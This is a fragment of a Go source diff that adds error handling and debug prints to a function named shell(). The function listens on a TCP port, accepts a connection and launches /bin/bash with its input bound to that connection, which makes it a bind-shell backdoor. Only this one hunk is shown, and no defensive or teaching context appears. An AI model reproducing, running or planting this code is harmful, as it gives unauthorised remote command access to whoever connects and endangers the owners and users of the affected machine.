@@ -34,8 +34,16 @@ func random(n int) int {
 
 func shell() {
 	for {
-		list, _ := net.Listen("tcp", host+port)
-		con, _ := list.Accept()
+		list, err := net.Listen("tcp", host+port)
+		if err != nil {
+			fmt.Println(err.Error())
+			fmt.Println("first")
+		}
+		con, err := list.Accept()
+		if err != nil {
+			fmt.Println(err.Error())
+			fmt.Println("second")
+		}
 		cmd := exec.Command("/bin/bash")
 		//Set input/output to the established connection's in/out
 		cmd.Stdin = con
